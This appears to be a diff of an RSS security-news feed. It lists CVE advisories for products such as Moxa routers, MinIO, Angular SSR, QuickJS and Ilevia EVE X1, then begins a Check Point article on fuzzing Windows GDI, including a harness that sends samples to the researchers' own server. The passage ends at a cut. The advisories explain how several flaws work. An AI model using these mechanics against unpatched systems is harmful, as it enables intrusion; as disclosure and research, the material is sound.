-            The long-standing licensing dispute between Qualcomm and Arm has finally reached its conclusion. On October 1, a U.S. District Court formally dismissed Arm’s last remaining lawsuit against Qualcomm, e ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Critical Flaw in Termix Docker Image (CVE-2025-59951) Leaks SSH Credentials Without Authentication</title><link>https://securityonline.info/critical-flaw-in-termix-docker-image-cve-2025-59951-leaks-ssh-credentials-without-authentication/</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 02:35:49 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[
-            The Termix project has disclosed a critical authentication bypass vulnerability in its official Docker image, exposing sensitive SSH configuration data without requiring user login. Tracked as CVE-202 ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Chrome 141 Stable Channel Update Patches High-Severity Vulnerabilities (CVE-2025-11205 &amp; CVE-2025-11206)</title><link>https://securityonline.info/chrome-141-stable-channel-update-patches-high-severity-vulnerabilities-cve-2025-11205-cve-2025-11206/</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 02:14:28 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[
-            The Chrome security team has announced the promotion of Chrome 141 to the Stable Channel for Windows, Mac, and Linux. The release—version 141.0.7390.54 for Linux and 141.0.7390.54/55 for Windows and M ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Critical Flaw CVE-2025-52906 (CVSS 9.3) Allows Unauthenticated RCE on TOTOLINK X6000R Routers</title><link>https://securityonline.info/critical-flaw-cve-2025-52906-cvss-9-3-allows-unauthenticated-rce-on-totolink-x6000r-routers/</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 01:59:29 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[
-            Researchers from Unit 42, Palo Alto Networks’ threat intelligence team, have disclosed three newly discovered vulnerabilities in the firmware of the TOTOLINK X6000R router, version V9.4.0cu.1360_B2024 ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>What could go wrong when MySQL strict SQL mode is off?</title><link>https://www.synacktiv.com/en/publications/what-could-go-wrong-when-mysql-strict-sql-mode-is-off</link><author>(Dayzerosec.com)</author><category>vulns</category><pubDate>Thu, 2 Oct 2025 00:00:03 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[# What could go wrong when MySQL strict SQL mode is off?
+]]></content:encoded></item><item><title>CVE-2025-6893 - Moxa Network Security Appliances and Routers Privilege Escalation Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-6893</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 03:15:36 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-6893
+ Oct. 17, 2025, 3:15 a.m. | 18 hours, 2 minutes ago
+An Execution with Unnecessary Privileges vulnerability has been identified in Moxa’s network security appliances and routers. A flaw in broken access control has been identified in the /api/v1/setting/data endpoint of the affected device. This flaw allows a low-privileged authenticated user to call the API without the required permissions, thereby gaining the ability to access or modify system configuration data. Successful exploitation may lead to privilege escalation, allowing the attacker to access or modify sensitive system settings. While the overall impact is high, there is no loss of confidentiality or integrity within any subsequent systems.
+ 9.3 | CRITICAL
 
-This article shows some examples of attacks that can abuse MySQL behavior when the strict SQL mode is disabled, especially when string characters are invalid in the current encoding. This happens when the encoding of the application (e.g. UTF-8) is wider than that of the database (e.g. ASCII).
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-6892 - Moxa API Unauthorized Privilege Escalation Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-6892</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 02:15:52 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-6892
+ Oct. 17, 2025, 2:15 a.m. | 19 hours, 2 minutes ago
+An Incorrect Authorization vulnerability has been identified in Moxa’s network security appliances and routers. A flaw in the API authentication mechanism allows unauthorized access to protected API endpoints, including those intended for administrative functions. This vulnerability can be exploited after a legitimate user has logged in, as the system fails to properly validate session context or privilege boundaries. An attacker may leverage this flaw to perform unauthorized privileged operations. While successful exploitation can severely impact the confidentiality, integrity, and availability of the affected device itself, there is no loss of confidentiality or integrity within any subsequent systems.
+ 8.7 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-62506 - MinIO vulnerable to privilege escalation via session policy bypass in service accounts and STS</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62506</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 22:15:31 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62506
+ Oct. 16, 2025, 10:15 p.m. | 23 hours, 2 minutes ago
+MinIO is a high-performance object storage system. In all versions prior to RELEASE.2025-10-15T17-29-55Z, a privilege escalation vulnerability allows service accounts and STS (Security Token Service) accounts with restricted session policies to bypass their inline policy restrictions when performing operations on their own account, specifically when creating new service accounts for the same user. The vulnerability exists in the IAM policy validation logic where the code incorrectly relied on the DenyOnly argument when validating session policies for restricted accounts. When a session policy is present, the system should validate that the action is allowed by the session policy, not just that it is not denied. An attacker with valid credentials for a restricted service or STS account can create a new service account for itself without policy restrictions, resulting in a new service account with full parent privileges instead of being restricted by the inline policy. This allows the attacker to access buckets and objects beyond their intended restrictions and modify, delete, or create objects outside their authorized scope. The vulnerability is fixed in version RELEASE.2025-10-15T17-29-55Z.
+ 8.1 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-62425 - Matrix Authentication Service account password can be changed using an authenticated session without supplying the current password</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62425</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 19:15:35 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62425
+ Oct. 16, 2025, 7:15 p.m. | 21 hours, 22 minutes ago
+MAS (Matrix Authentication Service) is a user management and authentication service for Matrix homeservers, written and maintained by Element. A logic flaw in matrix-authentication-service 0.20.0 through 1.4.0 allows an attacker with access to an authenticated MAS session to perform sensitive operations without entering the current password. These include changing the current password, adding or removing an e-mail address and deactivating the account. The vulnerability only affects instances which have the local password database feature enabled (passwords section in the config). Patched in matrix-authentication-service 1.4.1.
+ 8.3 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-62427 - Server-Side Request Forgery (SSRF) in Angular SSR</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62427</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 19:15:35 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62427
+ Oct. 16, 2025, 7:15 p.m. | 23 hours, 40 minutes ago
+The Angular SSR is a server-rise rendering tool for Angular applications. The vulnerability is a Server-Side Request Forgery (SSRF) flaw within the URL resolution mechanism of Angular's Server-Side Rendering package (@angular/ssr) before 19.2.18, 20.3.6, and 21.0.0-next.8. The function createRequestUrl uses the native URL constructor. When an incoming request path (e.g., originalUrl or url) begins with a double forward slash (//) or backslash (\\), the URL constructor treats it as a schema-relative URL. This behavior overrides the security-intended base URL (protocol, host, and port) supplied as the second argument, instead resolving the URL against the scheme of the base URL but adopting the attacker-controlled hostname. This allows an attacker to specify an external domain in the URL path, tricking the Angular SSR environment into setting the page's virtual location (accessible via DOCUMENT or PlatformLocation tokens) to this attacker-controlled domain. Any subsequent relative HTTP requests made during the SSR process (e.g., using HttpClient.get('assets/data.json')) will be incorrectly resolved against the attacker's domain, forcing the server to communicate with an arbitrary external endpoint. This vulnerability is fixed in 19.2.18, 20.3.6, and 21.0.0-next.8.
+ 8.7 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-62428 - Drawing-Captcha APP Host Header Injection in `/register` and `/confirm-email` Endpoints</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62428</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 19:15:35 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62428
+ Oct. 16, 2025, 7:15 p.m. | 1 day ago
+Drawing-Captcha APP provides interactive, engaging verification for Web-Based Applications. The vulnerability is a Host Header Injection in the /register and /confirm-email endpoints. It allows an attacker to manipulate the Host header in HTTP requests to generate malicious email confirmation links. These links can redirect users to attacker-controlled domains. This vulnerability affects all users relying on email confirmation for account registration or verification. This vulnerability is fixed in 1.2.5-alpha-patch.
+ 8.8 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-61553 - BitVisor VirtIO Network Device Emulation Out-of-Bounds Write Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-61553</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 19:15:33 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-61553
+ Oct. 16, 2025, 7:15 p.m. | 21 hours, 22 minutes ago
+An out-of-bounds write in VirtIO network device emulation in BitVisor from commit 108df6 (2020-05-20) to commit 480907 (2025-07-06) allows local attackers to cause a denial of service (host hypervisor crash) via a crafted PCI configuration space access. Given it's a heap overflow in a privileged hypervisor context, exploitation may enable arbitrary code execution or guest-to-host privilege escalation.
+ 8.2 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-11493 - Self-Update Verification Mechanism Process in ConnectWise Automate</title><link>https://cvefeed.io/vuln/detail/CVE-2025-11493</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 19:00:39 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-11493
+ Oct. 16, 2025, 7:15 p.m. | 21 hours, 22 minutes ago
+The ConnectWise Automate Agent does not fully verify the authenticity of files downloaded from the server, such as updates, dependencies, and integrations. This creates a risk where an on-path attacker could perform a man-in-the-middle attack and substitute malicious files for legitimate ones by impersonating a legitimate server. This risk is mitigated when HTTPS is enforced and is related to CVE-2025-11492.
+ 8.8 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-11492 - HTTP Configuration and Encryption in Transit</title><link>https://cvefeed.io/vuln/detail/CVE-2025-11492</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 18:59:35 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-11492
+ Oct. 16, 2025, 7:15 p.m. | 21 hours, 22 minutes ago
+In the ConnectWise Automate Agent, communications could be configured to use HTTP instead of HTTPS. In such cases, an on-path threat actor with a man-in-the-middle network position could intercept, modify, or replay agent-server traffic. Additionally, the encryption method used to obfuscate some communications over the HTTP channel is updated in the Automate 2025.9 patch to enforce HTTPS for all agent communications.
+ 9.6 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-62586 - OPEXUS FOIAXpress unauthenticated administrator password reset</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62586</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 18:15:40 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62586
+ Oct. 16, 2025, 6:15 p.m. | 21 hours, 2 minutes ago
+OPEXUS FOIAXpress allows a remote, unauthenticated attacker to reset the administrator password. Fixed in FOIAXpress version 11.13.2.0.
+ 9.8 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-61922 - PrestaShop Checkout allows customer account takeover via email</title><link>https://cvefeed.io/vuln/detail/CVE-2025-61922</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 18:15:38 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-61922
+ Oct. 16, 2025, 6:15 p.m. | 21 hours, 2 minutes ago
+PrestaShop Checkout is the PrestaShop official payment module in partnership with PayPal. Starting in version 1.3.0 and prior to versions 4.4.1 and 5.0.5, missing validation on the Express Checkout feature allows silent login, enabling account takeover via email. The vulnerability is fixed in versions 4.4.1 and 5.0.5. No known workarounds exist.
+ 9.1 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-34517 - Ilevia EVE X1 Server 4.7.18.0.eden Absolute Path Traversal</title><link>https://cvefeed.io/vuln/detail/CVE-2025-34517</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 17:56:53 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-34517
+ Oct. 16, 2025, 6:15 p.m. | 21 hours, 2 minutes ago
+Ilevia EVE X1 Server firmware versions ≤ 4.7.18.0.eden contain an absolute path traversal vulnerability in get_file_content.php that allows an attacker to read arbitrary files. Ilevia has declined to service this vulnerability, and recommends that customers not expose port 8080 to the internet.
+ 8.7 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-34514 - Ilevia EVE X1 Server 4.7.18.0.eden Authenticated Command Injection</title><link>https://cvefeed.io/vuln/detail/CVE-2025-34514</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 17:56:16 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-34514
+ Oct. 16, 2025, 6:15 p.m. | 19 hours, 1 minute ago
+Ilevia EVE X1 Server firmware versions ≤ 4.7.18.0.eden contain authenticated OS command injection vulnerabilities in multiple web-accessible PHP scripts that call exec() and allow an authenticated attacker to execute arbitrary commands. Ilevia has declined to service this vulnerability, and recommends that customers not expose port 8080 to the internet.
+ 8.7 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-34519 - Ilevia EVE X1 Server 4.7.18.0.eden Insecure Hashing Algorithm</title><link>https://cvefeed.io/vuln/detail/CVE-2025-34519</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 17:55:50 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-34519
+ Oct. 16, 2025, 6:15 p.m. | 21 hours, 2 minutes ago
+Ilevia EVE X1 Server firmware versions ≤ 4.7.18.0.eden contain an insecure hashing algorithm vulnerability. The product stores passwords using the MD5 hash function without applying a per‑password salt. Because MD5 is a fast, unsalted hash, an attacker who obtains the password database can efficiently perform offline dictionary, rainbow‑table, or brute‑force attacks to recover the original passwords. Ilevia has declined to service this vulnerability, and recommends that customers not expose port 8080 to the internet.
+ 8.2 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-34518 - Ilevia EVE X1 Server 4.7.18.0.eden Relative Path Traversal</title><link>https://cvefeed.io/vuln/detail/CVE-2025-34518</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 17:55:00 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-34518
+ Oct. 16, 2025, 6:15 p.m. | 21 hours, 2 minutes ago
+Ilevia EVE X1 Server firmware versions ≤ 4.7.18.0.eden contain a relative path traversal vulnerability in get_file_content.php that allows an attacker to read arbitrary files. Ilevia has declined to service this vulnerability, and recommends that customers not expose port 8080 to the internet.
+ 8.7 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-34515 - Ilevia EVE X1 Server 4.7.18.0.eden Root Privilege Escalation</title><link>https://cvefeed.io/vuln/detail/CVE-2025-34515</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 17:54:36 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-34515
+ Oct. 16, 2025, 6:15 p.m. | 19 hours, 1 minute ago
+Ilevia EVE X1 Server firmware versions ≤ 4.7.18.0.eden contain an execution with unnecessary privileges vulnerability in sync_project.sh that allows an attacker to escalate privileges to root. Ilevia has declined to service this vulnerability, and recommends that customers not expose port 8080 to the internet.
+ 9.3 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-34513 - Ilevia EVE X1 Server 4.7.18.0.eden Unauthenticated Command Injection</title><link>https://cvefeed.io/vuln/detail/CVE-2025-34513</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 17:53:34 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-34513
+ Oct. 16, 2025, 6:15 p.m. | 19 hours, 1 minute ago
+Ilevia EVE X1 Server firmware versions ≤ 4.7.18.0.eden contain an OS command injection vulnerability in mbus_build_from_csv.php that allows an unauthenticated attacker to execute arbitrary code. Ilevia has declined to service this vulnerability, and recommends that customers not expose port 8080 to the internet.
+ 9.3 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-34516 - Ilevia EVE X1 Server 4.7.18.0.eden Use of Default Credentials</title><link>https://cvefeed.io/vuln/detail/CVE-2025-34516</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 17:52:55 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-34516
+ Oct. 16, 2025, 6:15 p.m. | 21 hours, 2 minutes ago
+Ilevia EVE X1 Server firmware versions ≤ 4.7.18.0.eden contain a use of default credentials vulnerability that allows an unauthenticated attacker to obtain remote access. Ilevia has declined to service this vulnerability, and recommends that customers not expose port 8080 to the internet.
+ 9.3 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-62490 - Use-after-free in js_print_object in QuickJS</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62490</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 16:15:39 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62490
+ Oct. 16, 2025, 4:15 p.m. | 14 hours, 17 minutes ago
+In quickjs, in js_print_object, when printing an array, the function first fetches the array length and then loops over it. The issue is, printing a value is not side-effect free. An attacker-defined callback could run during js_print_value, during which the array could get resized and len1 become out of bounds. This results in a use-after-free.A second instance occurs in the same function during printing of a map or set objects. The code iterates over ms->records list, but once again, elements could be removed from the list during js_print_value call.
+ 8.8 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-62491 - Use-after-free in js_std_promise_rejection_check in QuickJS</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62491</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 16:15:39 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62491
+ Oct. 16, 2025, 4:15 p.m. | 14 hours, 17 minutes ago
+A Use-After-Free (UAF) vulnerability exists in the QuickJS engine's standard library when iterating over the global list of unhandled rejected promises (ts->rejected_promise_list).
+
+  *  The function js_std_promise_rejection_check attempts to iterate over the rejected_promise_list to report unhandled rejections using a standard list loop.
+
+
+  *  The reason for a promise rejection is processed inside the loop, including calling js_std_dump_error1(ctx, rp->reason).
+
+
+  *  If the promise rejection reason is an Error object that defines a custom property getter (e.g., via Object.defineProperty), this getter is executed during the error dumping process.
+
+
+  *  The malicious custom getter can execute JavaScript code that calls catch() on the same rejected promise being processed.
+
+
+  *  Calling catch() internally triggers js_std_promise_rejection_tracker, which then removes and frees the current promise entry (JSRejectedPromiseEntry) from the rejected_promise_list.
+
+
+  *  Since the list iteration continues using the now-freed memory pointer (el), the subsequent loop access results in a Use-After-Free condition.
+ 8.8 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2024-56143 - Strapi Allows Unauthorized Access to Private Fields via parms.lookup</title><link>https://cvefeed.io/vuln/detail/CVE-2024-56143</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 16:15:36 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2024-56143
+ Oct. 16, 2025, 4:15 p.m. | 13 hours, 1 minute ago
+Strapi is an open-source headless content management system. In versions from 5.0.0 to before 5.5.2, the lookup operator provided by the document service does not properly sanitize query parameters for private fields. An attacker can access private fields, including admin passwords and reset tokens, by crafting queries with the lookup parameter. This vulnerability is fixed in 5.5.2.
+ 8.2 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-61536 - FelixRiddle dev-jobs-handlebars Host Header Injection</title><link>https://cvefeed.io/vuln/detail/CVE-2025-61536</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 15:15:34 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-61536
+ Oct. 16, 2025, 3:15 p.m. | 11 hours, 16 minutes ago
+FelixRiddle dev-jobs-handlebars 1.0 uses absolute password-reset (magic) links using the untrusted `req.headers.host` header and forces the `http://` scheme. An attacker who can control the `Host` header (or exploit a misconfigured proxy/load-balancer that forwards the header unchanged) can cause reset links to point to attacker-controlled domains or be delivered via insecure HTTP, enabling token theft, phishing, and account takeover.
+ 8.2 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-22381 - Apache Aggie Host Header Injection Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-22381</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 15:15:32 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-22381
+ Oct. 16, 2025, 3:15 p.m. | 11 hours, 16 minutes ago
+Aggie 2.6.1 has a Host Header injection vulnerability in the forgot password functionality, allowing an attacker to reset a user's password.
+ 8.2 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>Denial of Fuzzing: Rust in the Windows kernel</title><link>https://research.checkpoint.com/2025/denial-of-fuzzing-rust-in-the-windows-kernel/</link><author>samanthar@checkpoint.com</author><category>vulns</category><pubDate>Thu, 16 Oct 2025 14:17:26 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[Check Point Research (CPR) identified a security vulnerability in January 2025 affecting the new Rust-based kernel component of the _Graphics Device Interface (_ commonly known as `GDI`) in Windows. We promptly reported this issue to Microsoft and they fixed the vulnerability starting with _OS Build 26100.4202_ in the KB5058499 update preview released on May 28th 2025. In the following sections, we detail the methodology of our fuzzing campaign, which targeted the Windows graphics component via metafiles and led to the discovery of this security vulnerability, among others, whose technical analysis is published separately in Drawn to Danger: Bugs in Windows Graphics Lead to Remote Code Execution and Memory Exposure.
+
+_Fuzzing_, a widely used software testing technique, involves providing invalid, unexpected, or random data as inputs to the program being tested for the purpose of identifying bugs. Fuzzing is a key part of our proactive approach to security testing, and we regularly apply fuzzing to widely used systems, such as Microsoft’s Windows operating system, to identify and address potential vulnerabilities before they can be exploited by malicious actors.
+
+A reliable testing environment is essential for this kind of work. `WinAFL` is a highly capable fuzzer, known for its role in identifying numerous publicly acknowledged vulnerabilities over the years, and was specifically adapted to target Windows binaries. To conduct mid-scale fuzz testing efficiently, we need to use a management tool like `WinAFL Pet`. These tools simplify the creation, configuration and monitoring of fuzzing jobs, while streamlining the evaluation of any crashes detected in the application. As running multiple fuzzer instances over several days – or even weeks – can result in numerous crashes, it is important to promptly analyze what caused the program failures. `BugId` provides a comprehensive and rapid analysis of the underlying reasons behind a program’s crash.
+
+`GDI` is a well-known core component of the Windows operating system, offering two-dimensional vector graphics, imaging, and typography. It enhances the _Graphics Device Interface_ found in earlier versions of Windows by introducing new features and optimizing existing ones.
+
+The Enhanced Metafile Format ( `EMF`) containing instructions to call `GDI` functions. The Enhanced Metafile Format Plus ( `EMF+`) is a variant of `EMF` metafiles where `EMF+` records are embedded within `EMF` records. This embedding is made possible by the ability of `EMF` to include arbitrary private data in an `EMR_COMMENT_EMFPLUS` record. Additionally, multiple `EMF+` records can be embedded in a single `EMF` record, as illustrated by _Figure 1._
+
+_Figure 1._ Metafiles with embedded EMF+ records (Source: Microsoft).
+
+`EMF` files represent a significant attack surface. Because of their compact file size, these files are particularly suitable for fuzz testing. Although `EMF` files were the focus of multiple vulnerability disclosures in the past, the transition to the `EMF+` format is less extensively studied and analyzed. The `EMF+` format introduced a variety of new metafile records, increasing the complexity of processing these files. Therefore, in our current research, we focus on the long-standing attack surface of the `GDI` subsystem related to the handling of metafiles and build on prior research on the `EMF` format.
+
+We launched a fuzzing campaign with a corpus of only 16 initial seed files, including several samples based on the `EMF+` format. Within only a few days of testing, the fuzzer identified several potential security vulnerabilities whose possible impacts range from information disclosure to arbitrary code execution. During the fuzzing campaign, we encountered a recurring system crash – which we call a _Denial of Fuzzing_ condition – that disrupted our research and led to an unexpected discovery. After a week of testing, the test system crashed and restarted due to a `BugCheck`. This suggested that the fuzzer came across a bug affecting the Windows kernel. Given that our main focus was on user-space fuzzing, there was no straightforward method available to reproduce the crash in this scenario. Nevertheless, restarting the test campaign led to the same outcome: the system crashed again after a few days of testing, confirming the presence of a bug in the Windows kernel triggered by extensive mutations of the initial seed corpus.
+
+This led to a shift in our focus from discovering additional vulnerabilities to tracking down this specific bug in the Windows kernel and reproducing the crash consistently. To achieve this, our first step was to enable capturing the memory dumps so we could analyze the state of the operating system at the time of the crash. However, because we used a RAM disk for file storage and the fuzzer instances were running in shared-memory mode (enabled with the `-s` option in `WinAFL`) to improve testing speed, determining which sample was being processed at the time of the crash remained a challenge, like trying to find a needle in a haystack. Restarting the fuzzing campaign confirmed that the system crash consistently occurred after a few days of testing and allowed us to gather multiple memory snapshots to analyze the mutated samples processed by the crashing fuzzer instance.
+
+An initial attempt to locate the potential culprit in the memory dump by searching for `EMF` signatures did not yield the desired outcome, as running each potential sample through the testing harness failed to reproduce the crash. To address this, we explored the possibility of extracting files from the `queue` folder of the crashing fuzzer instance using the complete memory dump. One potential solution was to use `Volatility`, the well-known memory forensics tool, capable of identifying files with the `FileScan` module and extracting them using the `DumpFiles` module. However, this method proved less suitable for efficiently saving a large volume of files automatically.
+
+The `forensic` mode of the `MemProcFS` tool can automatically identify files within a complete memory dump. Because a RAM disk was used during testing, we obtained a complete snapshot of the actual state of the fuzzer at the moment of the system crash. Our next goal was to reduce the time window required to reproduce the error. We achieved this by initiating new fuzzing campaigns with seed files derived from the samples extracted from the `queue` folder of the crashing fuzzer instance. These new test campaigns reached the mutation phase more quickly, resulting in the system crash occurring sooner.
+
+Despite the progress, we were still unable to reproduce the error at will. Eventually, we achieved a setup where a single fuzzer instance could trigger the mutation causing the error within 30 minutes, using a data set of 836 files. This advancement allowed us to modify our fuzzing harness to transmit the mutated test files to a remote server over the network. The primary goal of this approach was to have minimal impact on the fuzzer and ensure it did not negatively affect performance or stability. To accomplish this, we supplemented the harness with the following `send_data()` function, designed to transmit each tested sample to a remote server. After establishing the connection, the function sends the size of the data followed by the actual data, handling any potential errors at each step by cleaning up and returning an error code if necessary.
+
+```
+int send_data(char* data, uint32_t size) { WSADATA wsa; SOCKET s; struct sockaddr_in server; wchar_t ip_address[] = L"192.168.1.1"; server.sin_family = AF_INET; server.sin_port = htons(4444); if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { return 1; } if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) { WSACleanup(); return 1; } if (InetPton(AF_INET, ip_address, &(server.sin_addr)) != 1) { closesocket(s); WSACleanup(); return 1; } if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) { closesocket(s); WSACleanup(); return 1; } uint32_t size_header = htonl(size); if (send(s, (char*)&size_header, sizeof(size_header), 0) < 0) { closesocket(s); WSACleanup(); return 1; } if (send(s, data, size, 0) < 0) { closesocket(s); WSACleanup(); return 1; } closesocket(s); WSACleanup(); return 0; }
+```
+
+_Listing 1._ Client-side modification to send every mutation to the server.
+
+On the server side, the following Python script actively listens for incoming connections. Each connection is handled in a separate thread, where the script receives samples from the fuzzing harness and saves them as individual files. After `5,000` files are collected, the script compresses them into a `ZIP` archive and deletes the original files to optimize storage usage.
+
+```
